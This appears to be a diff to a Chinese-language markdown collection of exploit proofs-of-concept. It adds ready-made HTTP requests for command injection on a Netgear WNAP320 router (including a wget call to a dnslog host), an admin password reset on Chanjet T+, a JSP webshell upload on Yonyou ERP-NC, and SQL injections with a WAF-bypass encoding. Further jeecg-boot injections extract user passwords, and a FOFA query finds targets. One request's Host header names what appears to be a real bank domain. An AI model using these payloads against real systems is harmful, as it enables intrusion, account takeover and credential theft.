@@ -575,6 +575,12 @@ t/zzadmin/WEB-INF/classes/application.yml
 # 未授权访问/boardDataWW.php页面。
 # 输入框中输入：1111222233333;id>test.txt#
 # 访问/test.txt查看命令执行结果。
+POST /boardDataWW.php HTTP/1.1
+Host: 
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+
+macAddress=112233445566%3Bwget+http%3A%2F%2Fnstucl.dnslog.cn%23&reginfo=0&writeData=Submit
 ```
 
 https://www.cnblogs.com/VxerLee/p/16434463.html
@@ -1232,3 +1238,100 @@ test
 ```
 
 https://mp.weixin.qq.com/s/jCcfVg1acQljefJevTewHw
+
+## 用友 畅捷通T+ RecoverPassword.aspx 管理员密码修改漏洞
+
+```
+# 修改后的密码：admin/123qwe
+POST /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd HTTP/1.1
+
+{"pwdNew":"46f94c8de14fb36680850768ff1b7f2a"}
+```
+
+##  用友ERP-NC saveDoc.ajax 文件上传漏洞
+
+```
+POST /uapws/saveDoc.ajax?ws=/../../vul.jsp%00 HTTP/1.1
+Host: test.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: 
+X-Forwarded-For: 8.8.8.8
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 261
+
+content=%3C%25new%20java.io.FileOutputStream%28application.getRealPath%28%22%2f%22%29%2b%22%2f%22%2brequest.getParameter%28%22f%22%29%29.write%28new%20sun.misc.BASE64Decoder%28%29.decodeBuffer%28request.getParameter%28%22c%22%29%29%29%3Bout.close%28%29%3B%25%3E
+```
+
+https://www.shungg.cn/225.html
+
+## 用友ERP-NC ICurrtypeExportToCrmService SQL注入漏洞
+
+```
+# payload：1111' AND 7033=CONVERT(INT, (@@version+'~~'+db_name()))-- Mwnm
+# 过waf HTML编码处理：1111' AND 7033=CONVERT(INT, (&#64;&#64;&#118;&#101;&#114;&#115;&#105;&#111;&#110;&#43;&apos;&#126;&#126;&apos;&#43;&#100;&#98;&#95;&#110;&#97;&#109;&#101;&#40;&#41;))-- Mwnm
+POST /uapws/service/nc.itf.bd.crm.ICurrtypeExportToCrmService HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://test.com/uapws/service/nc.itf.bd.crm.ICurrtypeExportToCrmService?wsdl
+Cookie: 
+X-Forwarded-For: 8.8.8.8
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+SOAPAction: urn:exportCurrtypeToCrm
+Content-Type: text/xml;charset=UTF-8
+Host: purchase.cmbchina.com
+Content-Length: 522
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:icur="http://crm.bd.itf.nc/ICurrtypeExportToCrmService"&gt;
+   <soapenv:Header/>
+   <soapenv:Body>
+      <icur:exportCurrtypeToCrm>
+         <!--type: string-->
+         <string>>1111' AND 7033=CONVERT(INT, (&#64;&#64;&#118;&#101;&#114;&#115;&#105;&#111;&#110;&#43;&apos;&#126;&#126;&apos;&#43;&#100;&#98;&#95;&#110;&#97;&#109;&#101;&#40;&#41;))-- Mwnm </string>
+      </icur:exportCurrtypeToCrm>
+   </soapenv:Body>
+</soapenv:Envelope>
+```
+
+https://www.shungg.cn/225.html
+
+## netgear WNAP320路由器 boarddataww 存在命令执行漏洞
+
+```
+# fofa：title=="Netgear"
+# 执行命令
+POST /boardDataWW.php HTTP/1.1
+Host: 
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0
+
+macAddress=112233445566%3Bwhoami+%3E+.%2Foutput+%23&reginfo=0&writeData=Submit
+
+# 获取命令执行结果。
+/output
+```
+
+## jeecg-boot 多个SQL注入漏洞 CVE-2022-45205
+
+```
+# 注入点1（需要登录？）：
+/jeecg-boot/sys/dict/queryTableData?pageSize=100&table=information_schema.tables&text=table_name&code=TABLE_SCHEMA
+/jeecg-boot/sys/dict/queryTableData?table=%60sys_user%60&pageSize=22&pageNo=1&text=username&code=password
+
+# 注入点2（需要登录？）：
+/jeecg-boot/sys/duplicate/check?dataId=2000&fieldName=(select(if(((select/*%0A*/password/*%0A*/from/*%0A*/sys_user/*%0A*/where/*%0A*/username/*%0A*/='jeecg')='eee378a1258530cb'),sleep(4),1)))&fieldVal=1000&tableName=sys_log
+
+# 注入点3（该接口没有进行签名校验）：
+/jeecg-boot/sys/api/getDictItems?dictCode=sys_user%20,username,password
+```
+
+https://github.com/jeecgboot/jeecg-boot/issues/4128
+
+https://github.com/jeecgboot/jeecg-boot/issues/4393
